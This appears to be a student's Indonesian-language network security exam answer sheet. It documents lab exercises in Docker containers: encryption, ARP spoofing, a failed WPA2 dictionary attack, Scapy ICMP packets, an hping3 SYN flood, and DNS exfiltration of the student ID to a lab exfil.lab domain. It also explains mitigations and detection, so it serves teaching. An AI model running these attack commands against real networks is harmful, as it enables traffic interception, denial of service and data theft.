# Jawaban UTS Network Security

**NIM:** 24552011358
**Kasus:** 6

**Perhitungan kasus:** digit NIM dijumlah → 2+4+5+5+2+0+1+1+3+5+8 = 36, lalu 36 mod 10 = 6. Jadi Kasus 6.

Parameter yang dipakai: container `target-k6`, volume `vol-k6`, file `laporan-k6.txt`, password `kunci-k6-2026`, domain exfiltrasi `k6.exfil.lab`.

---

## Tugas 1 — Docker & Volume

```
docker volume create vol-k6
docker run --name w-k6 -v vol-k6:/data alpine sh -c "echo 24552011358 > /data/laporan-k6.txt"
docker rm w-k6
docker run --rm -v vol-k6:/data alpine cat /data/laporan-k6.txt
docker compose -p k6 -f b/b1-compose/docker-compose.yml up -d
docker compose -p k6 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker compose -p k6 -f b/b1-compose/docker-compose.yml down -v
```

Hasil: file `laporan-k6.txt` tetap bisa dibaca (`24552011358`) walaupun container yang menulisnya (`w-k6`) sudah dihapus duluan. Lalu `attacker` berhasil `wget` halaman nginx dari `target` dan dapat halaman "Welcome to nginx!" lengkap.

**Kesimpulan:** volume Docker itu persisten — datanya nggak ikut hilang walau containernya dihapus, karena volume hidup terpisah dari container. Dan dua container yang satu compose bisa saling panggil pakai nama service-nya langsung (Docker punya DNS internal sendiri).

---

## Tugas 2 — Kriptografi

```
docker run --rm -v "${PWD}:/work" uts-openssl sh -c "echo 'isi laporan rahasia kasus 6' > laporan-k6.txt && openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k6.txt -out laporan-k6.enc -pass pass:kunci-k6-2026 && sha256sum laporan-k6.txt && openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k6.enc -out hasil-k6.txt -pass pass:kunci-k6-2026 && sha256sum hasil-k6.txt"

docker run --rm -v "${PWD}:/work" uts-openssl sh -c "openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k6.pem -out cert-k6.pem -days 30 -subj /CN=k6.uts.local && openssl x509 -in cert-k6.pem -noout -subject -issuer -dates"
```

Hasil hash sebelum enkripsi dan sesudah dekripsi sama persis:
```
0c9c54d0ec69b4a2f1bc0203be795bac58cb271cdf581812f972e1a018919947  laporan-k6.txt
0c9c54d0ec69b4a2f1bc0203be795bac58cb271cdf581812f972e1a018919947  hasil-k6.txt
```

Sertifikatnya:
```
subject=CN=k6.uts.local
issuer=CN=k6.uts.local
notBefore=Nov 21 15:02:46 2026 GMT
notAfter=Dec 21 15:02:46 2026 GMT
```

**Kesimpulan:** karena hash sebelum-sesudah sama, berarti AES-256 berhasil enkripsi lalu dekripsi lagi tanpa merusak isinya sama sekali. Sertifikatnya self-signed — kelihatan dari `subject` dan `issuer` yang sama persis, artinya sertifikat ini nandatangani dirinya sendiri, bukan oleh CA yang sudah dipercaya browser/OS. Bedanya sama sertifikat CA-signed: kalau CA-signed, yang nandatangani itu otoritas yang memang sudah terdaftar dan dipercaya, jadi rantai kepercayaannya bisa dicek pihak lain. Self-signed nggak punya itu, makanya browser suka kasih warning.

---

## Tugas 3 — ARP Spoofing

Setup tiga container di satu network:
```
docker network create lab-arp-k6
docker run -d --name korban-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools sleep infinity
docker run -d --name gateway-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools sleep infinity
docker run -d --name penyerang-k6 --network lab-arp-k6 --cap-add NET_ADMIN uts-kali-tools sleep infinity
```
IP-nya: korban-k6 = 172.19.0.2, gateway-k6 = 172.19.0.3, penyerang-k6 = 172.19.0.4.

Cek ARP table korban sebelum dan sesudah diserang:
```
docker exec korban-k6 hping3 -c 2 -1 172.19.0.3
docker exec korban-k6 cat /proc/net/arp
docker exec -d penyerang-k6 timeout 20 arpspoof -i eth0 -t 172.19.0.2 172.19.0.3
docker exec korban-k6 cat /proc/net/arp
```

**Sebelum** arpspoof — MAC gateway masih asli:
```
172.19.0.3   8a:16:86:a3:4c:37
```

**Sesudah** arpspoof — MAC gateway berubah jadi MAC-nya penyerang:
```
172.19.0.3   56:65:56:28:4b:8a
172.19.0.4   56:65:56:28:4b:8a
```

**Kesimpulan:** ini bukti ARP spoofing berhasil. Awalnya korban tahu MAC asli gateway (`8a:16...`), tapi setelah `arpspoof` jalan, entry-nya berubah jadi MAC milik `penyerang-k6` (`56:65...`). Jadi korban sekarang mengira penyerang itu gateway — semua trafik yang harusnya ke gateway malah lewat penyerang dulu (ini yang disebut man-in-the-middle).

**Mitigasi:** pakai ARP statis di host penting (`arp -s <ip-gateway> <mac-asli>`) supaya ARP table-nya nggak bisa diubah sembarangan sama paket ARP palsu. Bisa juga pakai Dynamic ARP Inspection di switch, atau tools pemantau kayak arpwatch.

---

## Tugas 4 — Wireless / WPA2

Mencoba crack handshake dengan aircrack-ng:
```
docker run --rm -v "${PWD}/samples:/work" uts-kali-tools aircrack-ng -w /work/wordlist-k6.txt /work/handshake-k6.cap
```
Hasilnya error: `"This file is not a regular 802.11 (wireless) capture"`, 0 paket terbaca.

Dicek juga dengan tcpdump:
```
docker run --rm -v "${PWD}/samples:/work" uts-kali-tools tcpdump -r /work/handshake-k6.cap -c 5
```
Error lagi: `"invalid packet capture length 3244555293, bigger than snaplen of 65535"`.

Untuk mencari tahu penyebabnya, header pcap file ini diperiksa langsung dengan Python:
```python
import struct
with open('/work/handshake-k6.cap','rb') as f:
    data = f.read()
magic, ver_maj, ver_min, tz, sigfigs, snaplen, network = struct.unpack('<IHHiIII', data[:24])
print('Linktype:', network)
```
Hasilnya: `Linktype = 1 (Ethernet)`, padahal capture WiFi/WPA2 yang valid seharusnya memakai linktype **105 (IEEE 802.11)** atau **127 (Radiotap)**. Selain itu, panjang paket pertama yang terbaca adalah **3.244.555.293 byte**, padahal ukuran file itu sendiri hanya 8216 byte — angka yang jelas tidak mungkin.

**Kesimpulan:** file `handshake-k6.cap` bukan capture WPA2 yang valid. Header pcap-nya memang sah secara format, tetapi isinya berupa data acak, bukan hasil tangkapan jaringan yang sebenarnya. Seluruh 10 file kasus (k1–k10) berukuran identik persis (8216 byte), yang mengindikasikan file ini adalah placeholder yang belum diisi data asli.

Hal ini juga diperkuat oleh dokumentasi `samples/README.md` pada repository, yang menyebutkan bahwa capture file yang valid seharusnya berukuran **minimal 50 KB**, dan sebelum ujian penguji diwajibkan menguji `aircrack-ng` hingga menghasilkan `"Number of handshakes: 1"`. File yang didapat jauh di bawah ukuran minimum tersebut dan tidak lolos pengujian itu, sehingga kendala ini berasal dari materi yang belum disiapkan dengan benar, bukan dari kesalahan perintah yang dijalankan.

**Secara konseptual**, jika file capture valid, aircrack-ng akan mencoba setiap kata dalam wordlist sebagai kandidat PSK, menghitung PMK dari kombinasi SSID dan password tersebut, menurunkannya menjadi PTK, lalu mencocokkan MIC hasil perhitungan dengan MIC pada paket handshake keempat. Jika cocok, akan muncul pesan "KEY FOUND! [password]". Oleh karena itu, password WiFi yang kuat (panjang, acak, dan tidak terdapat dalam wordlist umum) jauh lebih aman terhadap serangan dictionary semacam ini.

---

## Tugas 5 — ICMP dengan Scapy

```
docker cp kasus/k5-scapy/kirim_icmp.py penyerang-k6:/tmp/kirim_icmp.py
docker exec penyerang-k6 python3 /tmp/kirim_icmp.py 172.19.0.2
```

Hasil:
```
Mengirim: IP / ICMP 172.19.0.4 > 172.19.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

**Kesimpulan:** script Scapy berhasil bikin paket ICMP echo-request sendiri (langsung susun layer IP+ICMP dari Python, bukan pakai `ping` bawaan OS), dikirim dari `penyerang-k6` ke `korban-k6`, dan dapat balasan. TTL 64 itu nilai default Linux, dan tipe ICMP 0 artinya Echo Reply — jadi korban memang hidup dan merespons. Scapy enak dipakai karena bisa bikin paket custom sampai level detail, cocok buat scanning, troubleshooting, atau testing keamanan jaringan.

---

## Tugas 6 — SYN Flood

```
docker compose -p k6 -f b/b3-syn-flood/docker-compose.yml up -d
docker compose exec target sh -c "cat /proc/sys/net/ipv4/tcp_syncookies"
docker compose exec target sh -c "netstat -ant | grep -c SYN_RECV"
docker compose exec -d attacker timeout 15 hping3 -S -p 80 --flood target
docker compose exec attacker timeout 10 tcpdump -i eth0 -nn "tcp[tcpflags] & tcp-syn != 0" -c 50
```

`tcp_syncookies` ternyata sudah `1` (aktif) dari awal. SYN_RECV sebelum serangan = 0. Pas serangan jalan, tcpdump berhasil tangkap **1847 paket** dalam waktu singkat, dengan source port yang beda-beda tiap paket (ciri khas flood), dan target tetap balas tiap SYN dengan SYN-ACK — jadi server nggak down, cuma kebanjiran paket.

**Kesimpulan:** meski ribuan paket SYN palsu dikirim dalam hitungan detik, SYN_RECV di target tetap rendah. Kemungkinan besar karena SYN cookies sudah aktif secara default di kernel, jadi server nggak perlu nyimpen state koneksi half-open di memori — makanya nggak gampang kehabisan resource meski dibanjiri SYN. Mitigasi tambahan yang bisa dipakai: rate-limit paket SYN per IP pakai iptables.

---

## Tugas 7 — DNS Exfiltration

```
docker compose -p k6 -f b/b4-dns-exfil/docker-compose.yml up -d
echo -n 24552011358 | xxd -p
docker compose exec attacker dig +short "@172.19.0.3" 3234353532303131333538.exfil.lab
docker compose logs dns | Select-String exfil.lab
echo 3234353532303131333538 | xxd -r -p
```

NIM `24552011358` diubah ke hex jadi `3234353532303131333538`, dikirim sebagai subdomain. Hasilnya:
```
dig +short @172.19.0.3 3234353532303131333538.exfil.lab
-> 10.0.0.99

Log dnsmasq:
query[A] 3234353532303131333538.exfil.lab from 172.19.0.2
config 3234353532303131333538.exfil.lab is 10.0.0.99
```
Didecode balik, hasilnya persis NIM asli lagi: `24552011358`.

**Kesimpulan:** ini contoh nyata gimana data bisa "diselundupkan" lewat query DNS biasa. Teknik ini susah diblokir firewall karena trafik DNS (port 53) hampir selalu diizinkan keluar — dianggap normal dan penting buat resolusi nama domain sehari-hari, dan firewall biasanya cuma cek port/protokol, bukan isi query-nya. Indikator buat mendeteksinya: subdomain yang panjangnya nggak wajar atau isinya karakter acak kayak hex/base32 (bukan nama domain manusiawi), dan ada banyak query berulang ke satu domain induk yang sama dalam waktu singkat.

---

## Cleanup

Setelah semua tugas selesai, semua container/network/volume yang dibuat untuk Kasus 6 (`korban-k6`, `gateway-k6`, `penyerang-k6`, `lab-arp-k6`, `vol-k6`, dst.) sudah dihapus dan dicek ulang dengan `docker ps -a`, `docker network ls`, dan `docker volume ls` — semuanya bersih.
